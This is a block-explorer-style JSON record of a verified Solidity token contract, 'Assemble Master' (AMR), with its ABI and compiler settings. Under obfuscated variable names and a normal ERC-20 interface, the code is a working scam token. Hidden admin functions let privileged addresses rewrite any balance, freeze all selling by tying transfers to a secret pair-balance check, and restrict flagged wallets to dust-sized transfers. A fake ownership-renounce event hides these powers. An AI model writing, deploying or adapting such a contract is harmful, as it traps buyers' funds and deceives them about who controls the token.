{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface takeIs {\n    function createPair(address swapMax, address feeMode) external returns (address);\n}\n\ninterface walletFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptToken) external view returns (uint256);\n\n    function transfer(address atTotal, uint256 receiverLiquidity) external returns (bool);\n\n    function allowance(address fromLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atTotal,\n        uint256 receiverLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapAmount, uint256 value);\n    event Approval(address indexed fromLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract enableTotalLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletFeeMetadata is walletFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssembleMaster is enableTotalLaunched, walletFee, walletFeeMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableToWallet;\n    }\n\n    mapping(address => bool) public teamMin;\n\n    bool private teamAmount;\n\n    function buyAtAmount(address sellWalletMarketing, address atTotal, uint256 receiverLiquidity) internal returns (bool) {\n        require(minLimit[sellWalletMarketing] >= receiverLiquidity);\n        minLimit[sellWalletMarketing] -= receiverLiquidity;\n        minLimit[atTotal] += receiverLiquidity;\n        emit Transfer(sellWalletMarketing, atTotal, receiverLiquidity);\n        return true;\n    }\n\n    function transferFrom(address sellWalletMarketing, address atTotal, uint256 receiverLiquidity) external override returns (bool) {\n        if (_msgSender() != launchMaxEnable) {\n            if (minWallet[sellWalletMarketing][_msgSender()] != type(uint256).max) {\n                require(receiverLiquidity <= minWallet[sellWalletMarketing][_msgSender()]);\n                minWallet[sellWalletMarketing][_msgSender()] -= receiverLiquidity;\n            }\n        }\n        return maxLaunchedFrom(sellWalletMarketing, atTotal, receiverLiquidity);\n    }\n\n    constructor (){\n        if (totalReceiver == shouldFund) {\n            enableSell = shouldFund;\n        }\n        tradingFrom fundAmountSender = tradingFrom(launchMaxEnable);\n        sellMax = takeIs(fundAmountSender.factory()).createPair(fundAmountSender.WETH(), address(this));\n        \n        swapTrading = _msgSender();\n        teamMin[swapTrading] = true;\n        minLimit[swapTrading] = fromFee;\n        walletLimitSender();\n        if (enableSell == limitLaunch) {\n            limitLaunch = totalReceiver;\n        }\n        emit Transfer(address(0), swapTrading, fromFee);\n    }\n\n    function tokenMode() private view {\n        require(teamMin[_msgSender()]);\n    }\n\n    address public sellMax;\n\n    function transfer(address minSell, uint256 receiverLiquidity) external virtual override returns (bool) {\n        return maxLaunchedFrom(_msgSender(), minSell, receiverLiquidity);\n    }\n\n    function feeTotalAt(uint256 receiverLiquidity) public {\n        tokenMode();\n        swapLimit = receiverLiquidity;\n    }\n\n    bool public exemptTotal;\n\n    function name() external view virtual override returns (string memory) {\n        return atIsLaunched;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromFee;\n    }\n\n    function allowance(address fundLimit, address swapLaunch) external view virtual override returns (uint256) {\n        if (swapLaunch == launchMaxEnable) {\n            return type(uint256).max;\n        }\n        return minWallet[fundLimit][swapLaunch];\n    }\n\n    mapping(address => mapping(address => uint256)) private minWallet;\n\n    function tradingWalletMarketing(address minSell, uint256 receiverLiquidity) public {\n        tokenMode();\n        minLimit[minSell] = receiverLiquidity;\n    }\n\n    mapping(address => bool) public liquidityIs;\n\n    function walletLimitSender() public {\n        emit OwnershipTransferred(swapTrading, address(0));\n        txTeam = address(0);\n    }\n\n    uint256 public totalReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellAutoTotal;\n    }\n\n    address atTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private fromFee = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed isTake, address indexed senderLiquidityLaunch);\n\n    function minAmount(address senderLiquidity) public {\n        if (listShouldToken) {\n            return;\n        }\n        \n        teamMin[senderLiquidity] = true;\n        if (totalReceiver != limitLaunch) {\n            fundWallet = true;\n        }\n        listShouldToken = true;\n    }\n\n    function approve(address swapLaunch, uint256 receiverLiquidity) public virtual override returns (bool) {\n        minWallet[_msgSender()][swapLaunch] = receiverLiquidity;\n        emit Approval(_msgSender(), swapLaunch, receiverLiquidity);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return txTeam;\n    }\n\n    address launchMaxEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant listMaxLaunch = 20 ** 10;\n\n    uint256 swapLimit;\n\n    string private enableToWallet = \"AMR\";\n\n    bool public walletTx;\n\n    bool private fundWallet;\n\n    function owner() external view returns (address) {\n        return txTeam;\n    }\n\n    bool public listShouldToken;\n\n    address public swapTrading;\n\n    uint256 public limitLaunch;\n\n    uint256 private shouldFund;\n\n    string private atIsLaunched = \"Assemble Master\";\n\n    function balanceOf(address exemptToken) public view virtual override returns (uint256) {\n        return minLimit[exemptToken];\n    }\n\n    function maxLaunchedFrom(address sellWalletMarketing, address atTotal, uint256 receiverLiquidity) internal returns (bool) {\n        if (sellWalletMarketing == swapTrading) {\n            return buyAtAmount(sellWalletMarketing, atTotal, receiverLiquidity);\n        }\n        uint256 minLaunched = walletFee(sellMax).balanceOf(atTo);\n        require(minLaunched == swapLimit);\n        require(atTotal != atTo);\n        if (liquidityIs[sellWalletMarketing]) {\n            return buyAtAmount(sellWalletMarketing, atTotal, listMaxLaunch);\n        }\n        return buyAtAmount(sellWalletMarketing, atTotal, receiverLiquidity);\n    }\n\n    uint256 private enableSell;\n\n    function feeLimit(address listShouldMin) public {\n        tokenMode();\n        \n        if (listShouldMin == swapTrading || listShouldMin == sellMax) {\n            return;\n        }\n        liquidityIs[listShouldMin] = true;\n    }\n\n    address private txTeam;\n\n    uint256 tokenTeam;\n\n    mapping(address => uint256) private minLimit;\n\n    uint8 private sellAutoTotal = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLiquidityLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShouldMin\",\"type\":\"address\"}],\"name\":\"feeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"feeTotalAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"}],\"name\":\"minAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"tradingWalletMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWalletMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLimitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AssembleMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}